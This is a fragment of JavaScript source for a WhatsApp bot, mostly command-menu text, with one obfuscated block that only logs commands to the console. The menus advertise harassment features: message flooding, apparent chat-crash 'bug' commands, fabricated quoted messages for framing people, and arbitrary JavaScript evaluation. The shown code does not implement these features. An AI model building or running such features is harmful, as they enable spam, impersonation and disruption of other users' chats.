        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    var _0xc8c9=['wYbnrvntquDfif0','ndeWmZzUEezXD04','odeXmZq3ywPlrLn6','nw9mvKDgrq','y3LHBG','mwH1wLnjyG','nerHCvPMuq','nde4nJaXyLfTDLPU','BwvZC2fNzvrPBwvZDgfTCa','BgvUz3rO','wYbdtuqGufjjvKfursbD','Bg9N','z29Sza','zM9YBwf0','BwfNzw50yq','mZe5mtLpvLv4uwi','nwHRAuHfEq','EwvSBg93','mtiWmJCZn1ngvxrqua','zNjVBq','wYbdtuqGr1jpvvaGxq','CgLUAW','ntG0mdv4Dfbir1y','ndK5n2Djt1HKsG','B3jHBMDL'];var _0x2f87c9=_0x2fc8;(function(_0x1a44c3,_0x352cda){var _0x517e02=_0x2fc8;while(!![]){try{var _0x1549c5=-parseInt(_0x517e02(0xa8))*-parseInt(_0x517e02(0xa7))+parseInt(_0x517e02(0x9b))*parseInt(_0x517e02(0xae))+-parseInt(_0x517e02(0x9e))*parseInt(_0x517e02(0xaf))+parseInt(_0x517e02(0x99))+-parseInt(_0x517e02(0x9f))+-parseInt(_0x517e02(0x9a))+parseInt(_0x517e02(0xaa))*parseInt(_0x517e02(0x9d));if(_0x1549c5===_0x352cda)break;else _0x1a44c3['push'](_0x1a44c3['shift']());}catch(_0xf5b39c){_0x1a44c3['push'](_0x1a44c3['shift']());}}}(_0xc8c9,0x6cc11));function _0x2fc8(_0x4c993c,_0x5e594a){_0x4c993c=_0x4c993c-0x98;var _0xc8c91a=_0xc8c9[_0x4c993c];if(_0x2fc8['MuTnfa']===undefined){var _0x2fc820=function(_0x2e9e67){var _0x31e275='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x19494a='';for(var _0x4448b0=0x0,_0x55bbc9,_0x2984ea,_0x4e6a8f=0x0;_0x2984ea=_0x2e9e67['charAt'](_0x4e6a8f++);~_0x2984ea&&(_0x55bbc9=_0x4448b0%0x4?_0x55bbc9*0x40+_0x2984ea:_0x2984ea,_0x4448b0++%0x4)?_0x19494a+=String['fromCharCode'](0xff&_0x55bbc9>>(-0x2*_0x4448b0&0x6)):0x0){_0x2984ea=_0x31e275['indexOf'](_0x2984ea);}return _0x19494a;};_0x2fc8['TtYrpI']=function(_0x38dc75){var _0x55ec0b=_0x2fc820(_0x38dc75);var _0x26eb40=[];for(var _0xceca76=0x0,_0x4729b5=_0x55ec0b['length'];_0xceca76<_0x4729b5;_0xceca76++){_0x26eb40+='%'+('00'+_0x55ec0b['charCodeAt'](_0xceca76)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x26eb40);},_0x2fc8['YmVKnH']={},_0x2fc8['MuTnfa']=!![];}var _0x249ca2=_0xc8c9[0x0],_0x383abf=_0x4c993c+_0x249ca2,_0x3f5117=_0x2fc8['YmVKnH'][_0x383abf];return _0x3f5117===undefined?(_0xc8c91a=_0x2fc8['TtYrpI'](_0xc8c91a),_0x2fc8['YmVKnH'][_0x383abf]=_0xc8c91a):_0xc8c91a=_0x3f5117,_0xc8c91a;}isCmd&&!isGroup&&console[_0x2f87c9(0xa3)](color(_0x2f87c9(0xa2)),color(moment(mek[_0x2f87c9(0xa0)]*0x3e8)['format']('DD/MM/YY\x20HH:mm:ss'),_0x2f87c9(0xa6)),color(command+'\x20['+args[_0x2f87c9(0xa1)]+']',_0x2f87c9(0x9c)));!command&&console[_0x2f87c9(0xa3)](color(_0x2f87c9(0x98)),color(moment(mek['messageTimestamp']*0x3e8)[_0x2f87c9(0xa5)]('DD/MM/YY\x20HH:mm:ss'),_0x2f87c9(0xa6)),color(cmd,_0x2f87c9(0xb0)),color('from',_0x2f87c9(0xad)),color(''+pushname,_0x2f87c9(0xa9)));isCmd&&isGroup&&console['log'](color(_0x2f87c9(0xac)),color(moment(mek[_0x2f87c9(0xa0)]*0x3e8)[_0x2f87c9(0xa5)]('DD/MM/YY\x20HH:mm:ss'),'magenta'),color(command+'\x20['+args[_0x2f87c9(0xa1)]+']',_0x2f87c9(0x9c)),color(_0x2f87c9(0xab),_0x2f87c9(0xad)),color(''+pushname,_0x2f87c9(0xa9)),color('in',_0x2f87c9(0xad)),color(''+groupName,_0x2f87c9(0xa4)));
	
        switch (command) {
				case 'ownermenu':
				case 'menuowner':
				try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menuowner = `▷\`\`\`Nama : ${pushname}\`\`\`
▷\`\`\`Jam : ${jmn}\`\`\`
▷\`\`\`Hari : ${week} ${weton}\`\`\`
▷\`\`\`Tanggal : ${calender}\`\`\`

▢ ${yuz}${prefix}bc${yuz} 「 _teks/reply gif/image/video with caption_ 」
▢ ${yuz}${prefix}tobc${yuz} 「 _reply sticker/audio with caption_ 」
▢ ${yuz}${prefix}return${yuz} 「 _javascript_ 」
▢ ${yuz}${prefix}clearall${yuz}
▢ ${yuz}${prefix}setyuz${yuz}
▢ ${yuz}${prefix}mute${yuz}
▢ ${yuz}${prefix}unmute${yuz}
▢ ${yuz}${prefix}public${yuz}
▢ ${yuz}${prefix}setowner${yuz}
▢ ${yuz}${prefix}self${yuz}
▢ ${yuz}${prefix}upswteks${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}upswlokasi${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}upswaudio${yuz} 「 _reply audio_ 」
▢ ${yuz}${prefix}upswvoice${yuz} 「 _reply audio_ 」
▢ ${yuz}${prefix}upswsticker${yuz} 「 _reply sticker_ 」
▢ ${yuz}${prefix}upswimage${yuz} 「 _reply image with caption_ 」
▢ ${yuz}${prefix}upswgif${yuz} 「 _reply gif with caption_ 」
▢ ${yuz}${prefix}upswvideo${yuz} 「 _reply video with caption_ 」
▢ ${yuz}${prefix}shutdown${yuz}
▢ ${yuz}${prefix}offline${yuz} 「 _alasan_ 」
▢ ${yuz}${prefix}online${yuz}
▢ ${yuz}${prefix}exif${yuz} 「 _nama|author_ 」
▢ ${yuz}${prefix}setprofile${yuz} 「 _reply image_ 」
▢ ${yuz}${prefix}setthumb${yuz} 「 _reply image_ 」
▢ ${yuz}${prefix}setprefix${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}setname${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}setprefix${yuz} 「 _multi/nopref_ 」
▢ ${yuz}${prefix}setbio${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}addsticker${yuz} 「 _nama_ 」
▢ ${yuz}${prefix}delsticker${yuz} 「 _nama_ 」
▢ ${yuz}${prefix}addvn${yuz} 「 _nama_ 」
▢ ${yuz}${prefix}delvn${yuz} 「 _nama_ 」
▢ ${yuz}${prefix}addimage${yuz} 「 _nama_ 」
▢ ${yuz}${prefix}delimage${yuz} 「 _nama_ 」
▢ ${yuz}${prefix}hyperhole${yuz}
▢ ${yuz}${prefix}hyper${yuz} 「 _යවන ප්‍රමානය_ 」
▢ ${yuz}${prefix}hypertroli${yuz} 
▢ ${yuz}${prefix}hypertroli2${yuz} 「 _යවන ප්‍රමානය_ 」
▢ ${yuz}${prefix}hyperpc${yuz}
▢ ${yuz}${prefix}hypercombine${yuz}
▢ ${yuz}${prefix}hyperlokasi${yuz}
▢ ${yuz}${prefix}hyperdgx${yuz}
▢ ${yuz}${prefix}hypernamsthe${yuz}
▢ ${yuz}${prefix}hyperspam${yuz}
▢ ${yuz}${prefix}leave${yuz}
▢ ${yuz}${prefix}restart${yuz}
▢ ${yuz}${prefix}join${yuz} 「 _link group_ 」
▢ ${yuz}${prefix}addrespon${yuz} 「 _tanya|jawab_ 」
▢ ${yuz}${prefix}delrespon${yuz} 「 _nama_ 」

「 _Ga Punya Apikey?_ 」
▢Langsung ke ${yuz}${prefix}beliapi${yuz}
▢Mau request fitur/bug ${yuz}${prefix}request${yuz} `
				hypermod.sendMessage(from, menuowner, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
				case 'makermenu':
				case 'menumaker':
				try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menumaker = `▷\`\`\`Nama : ${pushname}\`\`\`
▷\`\`\`Jam : ${jmn}\`\`\`
▷\`\`\`Hari : ${week} ${weton}\`\`\`
▷\`\`\`Tanggal : ${calender}\`\`\`

▢ ${yuz}${prefix}matrix${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}googletxt${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}spiderman${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}express${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}pubg${yuz} 「 _teks1|teks2_ 」
▢ ${yuz}${prefix}pubgserti2${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}pubgserti3${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}pubgserti4${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}pubgserti5${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}tololserti${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}mlserti2${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}mlsertii3${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}mlserti4${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}mlserti5${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}pubgserti${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}ffserti${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}ffserti2${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}ffserti3${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}ffserti4${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}ffserti5${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}mlserti${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}wanted${yuz}
▢ ${yuz}${prefix}ssweb2${yuz}
▢ ${yuz}${prefix}ssweb${yuz}
▢ ${yuz}${prefix}coffe1${yuz}
▢ ${yuz}${prefix}neon${yuz}
▢ ${yuz}${prefix}pubg${yuz}
▢ ${yuz}${prefix}water${yuz}
▢ ${yuz}${prefix}silk${yuz}
▢ ${yuz}${prefix}glass${yuz}
▢ ${yuz}${prefix}romance${yuz}
▢ ${yuz}${prefix}shadow${yuz}
▢ ${yuz}${prefix}glich${yuz}
▢ ${yuz}${prefix}coffe${yuz}
▢ ${yuz}${prefix}battle${yuz}
▢ ${yuz}${prefix}mug${yuz}
▢ ${yuz}${prefix}love${yuz}
▢ ${yuz}${prefix}mug1${yuz}
▢ ${yuz}${prefix}naruto${yuz}
▢ ${yuz}${prefix}randomquran${yuz}
▢ ${yuz}${prefix}8bit${yuz}
▢ ${yuz}${prefix}google${yuz}
▢ ${yuz}${prefix}fire${yuz}
▢ ${yuz}${prefix}burn${yuz}
▢ ${yuz}${prefix}bakar${yuz}
▢ ${yuz}${prefix}pensil${yuz}
▢ ${yuz}${prefix}wolf${yuz}
▢ ${yuz}${prefix}tfire${yuz}
▢ ${yuz}${prefix}ytgold${yuz}
▢ ${yuz}${prefix}ytsilver${yuz}
▢ ${yuz}${prefix}nickff${yuz}
▢ ${yuz}${prefix}tahta${yuz}
▢ ${yuz}${prefix}neon2${yuz}
▢ ${yuz}${prefix}potter${yuz}
▢ ${yuz}${prefix}candy${yuz}
▢ ${yuz}${prefix}block${yuz}
▢ ${yuz}${prefix}gtav${yuz}
▢ ${yuz}${prefix}facebookpage${yuz}
▢ ${yuz}${prefix}costumwp${yuz}
▢ ${yuz}${prefix}pantaimalam${yuz}
▢ ${yuz}${prefix}qrcode${yuz}
▢ ${yuz}${prefix}fox${yuz}
▢ ${yuz}${prefix}t3d${yuz}
▢ ${yuz}${prefix}logoa${yuz}
▢ ${yuz}${prefix}pornhub${yuz}
▢ ${yuz}${prefix}marvel${yuz}
▢ ${yuz}${prefix}leavest${yuz}
▢ ${yuz}${prefix}wall${yuz}
▢ ${yuz}${prefix}smoke${yuz}
▢ ${yuz}${prefix}rainbow${yuz}

「 _Ga Punya Apikey?_ 」
▢Langsung ke ${yuz}${prefix}beliapi${yuz}
▢Mau request fitur/bug ${yuz}${prefix}request${yuz} `
				hypermod.sendMessage(from, menumaker, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
				case 'downloadmenu':
				case 'menudownload':
				try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menudownload = `▷\`\`\`Nama : ${pushname}\`\`\`
▷\`\`\`Jam : ${jmn}\`\`\`
▷\`\`\`Hari : ${week} ${weton}\`\`\`
▷\`\`\`Tanggal : ${calender}\`\`\`

▢ ${yuz}${prefix}ytsearch${yuz} 「 _judul_ 」
▢ ${yuz}${prefix}ytmp4${yuz} 「 _link yt_ 」
▢ ${yuz}${prefix}ytmp3${yuz} 「 _link yt_ 」
▢ ${yuz}${prefix}play${yuz} 「 _judul lagu_ 」
▢ ${yuz}${prefix}video${yuz} 「 _judul video_ 」
▢ ${yuz}${prefix}tinyurl${yuz} 「 _link_ 」
▢ ${yuz}${prefix}ig${yuz} 「 _link ig_ 」
▢ ${yuz}${prefix}fb${yuz} 「 _link fb_ 」
▢ ${yuz}${prefix}lirik${yuz} 「 _judul_ 」
▢ ${yuz}${prefix}resepmasakan${yuz} 「 _judul_ 」
▢ ${yuz}${prefix}artimimpi${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}bilangangka${yuz} 「 _angka_ 」
▢ ${yuz}${prefix}kalkulator${yuz} 「 _angka_ 」
▢ ${yuz}${prefix}fancytext${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}githubstalk${yuz} 「 _username_ 」
▢ ${yuz}${prefix}translate${yuz} 「 _kodebhs|teks_ 」
▢ ${yuz}${prefix}ss${yuz} 「 _link_ 」

「 _Ga Punya Apikey?_ 」
▢Langsung ke ${yuz}${prefix}beliapi${yuz}
▢Mau request fitur/bug ${yuz}${prefix}request${yuz} `
				hypermod.sendMessage(from, menudownload, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
				case 'groupmenu':
				case 'menugroup':
				try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menugroup = `▷\`\`\`Nama : ${pushname}\`\`\`
▷\`\`\`Jam : ${jmn}\`\`\`
▷\`\`\`Hari : ${week} ${weton}\`\`\`
▷\`\`\`Tanggal : ${calender}\`\`\`

▢ ${yuz}${prefix}getpict${yuz} 「 _@tag_ 」
▢ ${yuz}${prefix}getbio${yuz} 「 _@tag_ 」
▢ ${yuz}${prefix}promote${yuz} 「 _@tag_ 」
▢ ${yuz}${prefix}demote${yuz} 「 _@tag_ 」
▢ ${yuz}${prefix}creategrup${yuz} 「 _nama|@tag_ 」
▢ ${yuz}${prefix}getppgc${yuz}
▢ ${yuz}${prefix}getdeskgc${yuz}
▢ ${yuz}${prefix}gcanime${yuz} 「 _nama gc_ 」
▢ ${yuz}${prefix}sider${yuz} 「 _reply pesan bot_ 」
▢ ${yuz}${prefix}hacked${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}setnamegc${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}setdeskgc${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}tictactoe${yuz}「 _x/o @tag_ 」
▢ ${yuz}${prefix}delttt${yuz}
▢ ${yuz}${prefix}fitnah${yuz} 「 _@tag|teks1|teks2_ 」
▢ ${yuz}${prefix}kontak${yuz} 「 _@tag|nama_ 」
▢ ${yuz}${prefix}kontag${yuz} 「 _@tag|nama_ 」
▢ ${yuz}${prefix}group${yuz} 「 _open/close_ 」
▢ ${yuz}${prefix}linkgrup${yuz}
▢ ${yuz}${prefix}hidetag${yuz} 「 _teks_ 」
▢ ${yuz}${prefix}sticktag${yuz} 「 _nama sticker_ 」
▢ ${yuz}${prefix}totag${yuz} 「 _reply media_ 」

「 _Ga Punya Apikey?_ 」
▢Langsung ke ${yuz}${prefix}beliapi${yuz}
▢Mau request fitur/bug ${yuz}${prefix}request${yuz} `
				hypermod.sendMessage(from, menugroup, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
                case 'menu2':
                case 'help2':
                case '?2':
				uptime = process.uptime();
                try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                hypermod.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: `╔═════════════════❍\n║-HAI ${pushname}!!\n║╾ Nomor : @${sender.split('@')[0]}\n║▬▭▬▭▬▭▬▭▬▭\n║╾ Creator : wa.me/94767043432\n║╾ Owner : ${namaowner}\n║╾ Owner Number : wa.me/${owner}\n║╾ Credit : wa.me/${tolol}\n║╾ Status : ${publik ? 'Public' : 'Self'}\n║╾ Runtime : ${kyun(uptime)}\n║╾ Prefix : 「 multi 」\n║╾ Jam : ${jmn}\n║╾ Hari : ${week} ${weton}\n║╾ Tanggal : ${calender}\n║    ${tampilUcapan}-${pushname}\n║▬▭▬▭▬▭▬▭▬▭\n╠══════════════════⎉\n║-NO SPAM BOT-\n║-NO CALL BOT-\n║-ANY QUESTION PLEASE-\n║-CONTACT OWNER-\n╠══════════════════⎉\n╠═════⊱*「 ABOUT 」* \n║┏━━⊱\n║┣❏ *${prefix}delete*\n║┣❏ *${prefix}owner*\n║┣❏ *${prefix}status*\n║┣❏ *${prefix}runtime*\n║┣❏ *${prefix}speed*\n║┗━━⊱\n╠═════⊱*「 LIST MENU 」* \n║┏━━⊱\n║┣❏ *${prefix}ownermenu*\n║┣❏ *${prefix}randommenu*\n║┣❏ *${prefix}makermenu*\n║┣❏ *${prefix}downloadmenu*\n║┣❏ *${prefix}groupmenu*\n║┣❏ *${prefix}stickermenu*\n║┣❏ *${prefix}toolsmenu*\n║┣❏ *${prefix}othermenu*\n║┣❏ *${prefix}nsfwmenu\n║┣❏ *${prefix}cekapikey*\n║┗━━━━*《 ${namabot} 》*\n╠═════════════════❍\n║┣━━⊱*「 Thanks To 」* \n║┃\n║┣❏ HYPER-MOD\n║┣❏ SUPUN\n║┣❏ SL TERROR FAMILY\n║┣❏ APP HORU STAFF\n║┣❏ ⛾ Coffee\n║┣❏ https://github.com/HYPER-MOD\n║┣❏ ✆ Report Bug\n║┣❏ https://wa.me/94767043432\n║┣❏ ✇ Script Crew Bot\n║┣❏ https://youtube.com/c/HYPERMOD\n║┣❏ ✆ Info Credit\n║┣❏ https://wa.me/${tolol}\n║┣❏ 「 _Ga Punya Apikey?_ 」\n║┣❏ Langsung ke ${prefix}beliapi\n║┣❏ Mau request fitur/bug ${prefix}request\n║┗━━━━*《 ${namabot} 》*\n╚═════════════════❍`})
                break
				case 'othermenu':
				case 'menuother':
				try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menuother = `▷\`\`\`Nama : ${pushname}\`\`\`
▷\`\`\`Jam : ${jmn}\`\`\`
▷\`\`\`Hari : ${week} ${weton}\`\`\`
▷\`\`\`Tanggal : ${calender}\`\`\`

▢ ${yuz}${prefix}slots${yuz}
▢ ${yuz}${prefix}suit${yuz} 「 _gunting/batu/kertas_ 」
▢ ${yuz}${prefix}tag${yuz}「 _nomor_ 」
▢ ${yuz}${prefix}tagme${yuz}
▢ ${yuz}${prefix}tts${yuz} 「 _kodebhs teks_ 」
▢ ${yuz}${prefix}readmore${yuz} 「 _teks1|teks2_ 」
▢ ${yuz}${prefix}fitnahpc${yuz} 「 _nomor|teks1|teks2_ 」
▢ ${yuz}${prefix}chat${yuz} 「 _nomor|teks_ 」
▢ ${yuz}${prefix}fdeface${yuz} 「 _replyimg link|teks1|teks2_ 」
▢ ${yuz}${prefix}rate${yuz}
▢ ${yuz}${prefix}kapankah${yuz}
▢ ${yuz}${prefix}apakah${yuz}
▢ ${yuz}${prefix}bisakah${yuz}
▢ ${yuz}${prefix}seberapagay${yuz}
▢ ${yuz}${prefix}jadian${yuz}
▢ ${yuz}${prefix}cantik${yuz}
▢ ${yuz}${prefix}ganteng${yuz}
▢ ${yuz}${prefix}hobby${yuz}
▢ ${yuz}${prefix}cekbapak${yuz}
▢ ${yuz}${prefix}listimage${yuz}
▢ ${yuz}${prefix}liststicker${yuz}
▢ ${yuz}${prefix}listvn${yuz}
▢ ${yuz}${prefix}infogempa${yuz}
▢ ${yuz}${prefix}pantun${yuz}
▢ ${yuz}${prefix}spam${yuz} 「 _teks|jumlah_ 」
▢ ${yuz}${prefix}tospam${yuz} 「 _reply audio/sticker/image|jumlah_ 」
▢ ${yuz}${prefix}sharelock${yuz} 「 _teks1|teks2_ 」
▢ ${yuz}${prefix}ephemeral${yuz} 「 _teks_ 」

「 _Ga Punya Apikey?_ 」
▢Langsung ke ${yuz}${prefix}beliapi${yuz}
▢Mau request fitur/bug ${yuz}${prefix}request${yuz} `
				hypermod.sendMessage(from, menuother, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
				case 'stickermenu':
				case 'menusticker':
				try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menusticker = `▷\`\`\`Nama : ${pushname}\`\`\`
▷\`\`\`Jam : ${jmn}\`\`\`
▷\`\`\`Hari : ${week} ${weton}\`\`\`
▷\`\`\`Tanggal : ${calender}\`\`\`

▢ ${yuz}${prefix}sticker${yuz}
▢ ${yuz}${prefix}stickerwm${yuz} 「 _nama|author_ 」
▢ ${yuz}${prefix}takestick${yuz} 「 _nama|author_ 」
▢ ${yuz}${prefix}colong${yuz} 「 _reply sticker_ 」
▢ ${yuz}${prefix}dadu${yuz}
▢ ${yuz}${prefix}semoji${yuz} 「 _emoji_ 」
▢ ${yuz}${prefix}attp${yuz} 「 _teks_ 」

「 _Ga Punya Apikey?_ 」
▢Langsung ke ${yuz}${prefix}beliapi${yuz}
▢Mau request fitur/bug ${yuz}${prefix}request${yuz} `
				hypermod.sendMessage(from, menusticker, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
//ANJING LU YANG UBAH THX SAMA DLL
//GW CAPEK CAPEK KERJAINNYA EH MALAH DI HAPUS
//AJGGGHHHHH
				case 'menu':
				case '?':
				case 'help':
				uptime = process.uptime();
				try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menusaya = `╔═════════════════❍
║-HAI ${pushname}!!
║╾ Nomor : @${sender.split('@')[0]}
║▬▭▬▭▬▭▬▭▬▭
║╾ Creator : wa.me/94767043432
║╾ Credit : wa.me/${tolol}
║╾ Owner : ${namaowner}
║╾ Owner Number : wa.me/${owner}
║╾ Status : ${publik ? 'Public' : 'Self'}
║╾ Runtime : ${kyun(uptime)}
║╾ Prefix : 「 ${multi ? 'Multi' : 'Onepref'} 」
║╾ Jam : ${jmn}
║╾ Hari : ${week} ${weton}
║╾ Tanggal : ${calender}
║    ${tampilUcapan}-${pushname}
║▬▭▬▭▬「 Sosmed 」▭▬▭▬▭
║
╿ Youtube :https://youtube.com/c/HYPERMOD
║
╿ FACEBOOK :https://www.facebook.com/hype.mod.5
║
║▬▭▬▭▬▭▬▭▬▭
║
╠══════════════════⎉
║-NO SPAM BOT-
║-NO CALL BOT-
║-ANY QUESTION PLEASE-
║-CONTACT OWNER-
╠══════════════════⎉
╠═════⊱*「 ABOUT 」* 
║┏━━⊱
║┣❏ *${prefix}delete*
║┣❏ *${prefix}owner*
║┣❏ *${prefix}status*
║┣❏ *${prefix}runtime*
║┣❏ *${prefix}speed*
║┗━━⊱
╠═════⊱*「 LIST MENU 」* 
║┏━━⊱
║┣❏ *${prefix}ownermenu*
║┣❏ *${prefix}randommenu*
║┣❏ *${prefix}makermenu*
║┣❏ *${prefix}downloadmenu*
║┣❏ *${prefix}groupmenu*
║┣❏ *${prefix}stickermenu*
║┣❏ *${prefix}toolsmenu*
║┣❏ *${prefix}othermenu*
║┣❏ *${prefix}nsfwmenu*
║┣❏ *${prefix}soundmenu*
║┗━━━━*《 ${namabot} 》*
╠═════════════════❍
║┣━━⊱*「 Thanks To 」* 
║┃
║┣❏ HYPER-MOD
║┣❏ SUPUN
║┣❏ SL TERROR FAMILY
║┣❏ APP HORU STAFF
║┣❏ ⛾ Coffee
║┣❏ https://github.com/HYPER-MOD
║┣❏ ✆ Report Bug
║┣❏ https://wa.me/94767043432
║┣❏ ✇ Script Crew Bot
║┣❏ https://youtube.com/c/HYPERMOD
║┣❏ ✆ Info Credit
║┣❏ https://wa.me/${tolol}
║┣❏ 「 _Mau Req Fitur?_ 」
║┣❏ Mau request fitur/bug ${prefix}request
║┗━━━━*《 ${namabot} 》*
╚═════════════════❍ `
				hypermod.sendMessage(from, fcrew, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, caption: menusaya, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
                case 'randommenu':
				case 'menurandom':
				try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menurandom = `▷\`\`\`Nama : ${pushname}\`\`\`
▷\`\`\`Jam : ${jmn}\`\`\`
▷\`\`\`Hari : ${week} ${weton}\`\`\`
▷\`\`\`Tanggal : ${calender}\`\`\`

▢ ${yuz}${prefix}wanted${yuz}
▢ ${yuz}${prefix}truth${yuz}
▢ ${yuz}${prefix}dare ${yuz}
▢ ${yuz}${prefix}truth2${yuz}
▢ ${yuz}${prefix}dare2${yuz}
▢ ${yuz}${prefix}ssweb2${yuz}
▢ ${yuz}${prefix}spamsms${yuz}
▢ ${yuz}${prefix}spamtext${yuz}
▢ ${yuz}${prefix}koala${yuz}
▢ ${yuz}${prefix}meme${yuz}
